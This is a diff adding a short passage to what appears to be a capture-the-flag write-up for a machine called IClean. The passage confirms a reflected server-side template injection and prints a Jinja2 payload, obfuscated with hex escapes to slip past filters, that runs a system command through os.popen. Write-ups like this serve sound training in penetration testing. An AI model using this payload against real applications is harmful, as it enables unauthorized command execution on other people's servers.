@@ -257,6 +257,16 @@ We're being able to see our output reflected, so the first vulnerability that co
 
 <br />
 
+![17](../../../assets/images/IClean/17.png)
+
+<br />
+
+We did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
+
+Payload -> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+<br />
+
 
 
 <br />
